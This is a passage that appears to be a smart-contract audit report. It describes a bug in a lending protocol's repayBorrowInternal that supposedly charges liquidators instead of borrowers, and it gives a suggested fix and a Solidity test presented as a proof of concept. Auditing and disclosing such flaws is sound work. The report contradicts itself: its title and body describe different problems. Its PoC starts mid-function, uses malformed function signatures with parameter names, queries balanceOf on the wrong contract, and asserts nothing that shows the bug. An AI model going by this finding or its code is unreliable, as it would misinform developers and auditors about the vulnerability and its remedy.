**repayBorrowInternal allows arbitrary third-party to repay on behalf of borrower without authorization**

_Bug Severity:_ High 

_Target:_


**Summary:**

The repayBorrow in a LEND protocol has incorrect transferFrom parameter, the function uses an improper transferFrom that unintentionally deducts funds from the liquidator even when the borrower calls repayBorrow.




**Vulnerability Details:**

If a user borrows from the protocol, and later calls repayBorrow, the function does not deduct the funds from the borrower, but it charges any liquidator that approve allowance to the protocol, and updates the borrower's balance while borrower does not pay anything from his debt

```solidity
// coreRouter.sol

function repayBorrowInternal(address borrower, address liquidator, uint256 _amount, address _lToken, bool _isSameChain) internal {
     
     ... existing code ....

    // Tokens transferFrom borrower to the contract
@audit-bug--> IERC20(_token).safeTransferFrom(liquidator, address(this), repayAmountFinal); // ⚠️ BUG: the transferFrom should not always deducts the money from liquidator
```

- For example:

1. User A borrows funds from protocol.

2. User B (a liquidator) unknowingly approves allowance to CoreRouter.

3. User A repays the debt using `repayBorrow`, but CoreRouter deducts funds from User B instead.

4. User A's debt is cleared; User B loses funds.



**Impact:**

- Liquidators will always be charged for debt they never borrowed.
- Actual borrowers will get free debt, because when they borrowed the debts and wanted to repay, the protocol will not charges them, instead, the protocol will deduct the Amount from liquiditors and also update the borrower's balance.




**Recommendation**

```solidity
// coreRouter.sol

function repayBorrowInternal(address borrower, address liquidator, uint256 _amount, address _lToken, bool _isSameChain) internal {
     
     ... existing code ....

    // Tokens transferFrom borrower to the contract
@audit-fix--> IERC20(_token).safeTransferFrom(msg.sender, address(this), repayAmountFinal);
```





**Proof of concept (PoC)**

The below PoC shows how a User borrowed 1_000e18, and when he wanted to repay he calls repayBorrow, but the repayBorrow function didn't deduct the amount from borrower but from liquiditor, after transaction was successful, the borrower balance is still the same.

```solidity
vm.startPrank(borrower);

    // approve
    IERC20(USDC).approve(CoreRouter, type(uint256).max);
    console2.log("USDC Allowance for CoreRouter:", IERC20(USDC).allowance(borrower, CoreRouter));

       (bool success, bytes memory data) = address(CoreRouter).call(
    abi.encodeWithSignature("supply(uint256,address)", 10_000e6, USDC)
        );
     if (!success) console2.log("Revert reason:", string(data));

     console2.log("borrower supplied-1:", ICoreRouter(USDC).balanceOf(borrower));

     vm.stopPrank();

    }

    function test_borrow() public {
        vm.startPrank(borrower);

       (bool success, bytes memory data) = address(CoreRouter).call(
    abi.encodeWithSignature("borrow(uint256 borrowAmount)", 1_000e18)
        );
     if (!success) console2.log("Revert reason:", string(data));

     require(success, string(data));
     vm.stopPrank();
    }


    function test_rapayBorrow() public {

        vm.startPrank(borrower);

       (bool success, bytes memory data) = address(CoreRouter).call(
    abi.encodeWithSignature("repayBorrow(uint256 repayAmount)", 1_000e18)
        );
     if (!success) console2.log("Revert reason:", string(data));

     require(success, string(data));
     vm.stopPrank();

     assertEq(IERC20(USDC).balanceOf(borrower), 10_000e6);
    }
```

**PoC Output:**
![PoC](https://github.com/user-attachments/assets/171deb23-f349-4cd8-af7f-999e0e959fb2)
